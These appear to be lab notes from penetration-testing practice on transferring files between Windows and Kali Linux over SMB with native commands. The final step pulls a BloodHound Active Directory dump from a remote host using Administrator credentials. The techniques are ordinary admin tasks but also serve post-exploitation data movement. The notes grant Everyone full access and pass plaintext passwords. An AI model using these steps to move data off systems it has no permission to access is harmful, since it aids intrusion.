File Transfer with Native Tools (Windows ↔ Linux through SMB) - Windows as SMB Server
from an AD object/SPN perspective, cifs/ is the SMB service.
🟦 PART 1 — Windows as SMB Server (native)
✔ Step 1 — Create a folder to share
Run in Windows CMD:
cmd> mkdir C:\Users\student\Desktop\testshare
✔ Step 2 — Share the folder (native command)
cmd> net.exe share <ShareName>=<PathToShareFolder> /grant:Everyone,FULL
cmd> C:\Users\student\Desktop>C:\Windows\System32\net.exe share share=C:\Users\student\Desktop\testshare /grant:Everyone,FULL
share was shared successfully.
This creates a share name “share”: (\\<Windows-IP>\share)
Eg: \\192.168.31.138\share
# Verify the Share exist
PS > net share
# Remove the share
PS> Remove-SmbShare -Name "share"

🟩 PART 2 — Linux as SMB Client (native kernel CIFS)
Linux does not need Samba installed to mount an SMB share. The CIFS client is built into the kernel.
✔ Step 1 — Create mount point
$ sudo mkdir -p /mnt/win
✔ Step 2 — Mount the Windows share
$ sudo mount -t cifs //<Windows IP>/share /mnt/win -o username=USERNAME,password=PASSWORD
┌──(kali㉿kali)-[/mnt]
└─$ sudo mount -t cifs //192.168.31.138/share /mnt/win -o username=student,password=student,vers=3.0,sec=ntlmssp
• vers=3.0 Forces SMB protocol version 3.0. This is important because:
Windows 10/11 and Server 2016+ default to SMB3
SMB1 is disabled by default on modern Windows
Negotiation sometimes fails unless you explicitly specify a version
• sec=ntlmssp Forces NTLMSSP authentication. This is the correct choice for modern Windows hosts unless you’ve configured Kerberos or AD integration.
• mount -t cifs = Tells Linux to mount a Windows/SMB share using the CIFS driver.
• //192.168.31.138/share = UNC path to the SMB share you created with net share.
• /mnt/win = Local mount point on the Linux system.
• -o username=student,password=student = Credentials passed directly in the options string. (Works for labs; in production you’d use a credentials file.)
Now Linux sees the Windows folder at:
/mnt/win

🟨 PART 3 — Linux → Windows file transfer
Now that the share is mounted:
$ cp file.txt /mnt/win/
That’s it — file lands in:
C:\Users\student\Desktop\testshare


🟧 PART 4 — Windows → Linux file transfer
Since Linux mounted the Windows share, Windows can also push files into it.
On Windows:
cmd> C:\Users\student\Desktop>copy C:\Users\student\Desktop\file.txt \\192.168.31.138\share\
        1 file(s) copied.
Linux will see it appear in:
/mnt/win/file.txt
 Cleanup - Unmount (Linux)
┌──(kali㉿kali)-[/mnt]
└─$ sudo umount /mnt/win


🟧 PART 5 — Windows(SMBServer) → Windows file transfer
Try to "map" the connection with the credentials explicitly to S Drive. Run this on the machine where you want to receive the file:
PS> $pass = ConvertTo-SecureString "PasswordToSMBServerBox" -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential("<DomainNameOfSMBServerBox>\Administrator", $pass)
# Connect to the share explicitly using the credentials
PS> New-PSDrive -Name "S" -PSProvider FileSystem -Root "\\172.16.118.252\share" -Credential $cred
# Once that drive is mapped, you can just copy the File from SMBServer → Your Window Box:
PS> Copy-Item "S:\20260219225438_BloodHound.zip" -Destination "C:\Tools\"






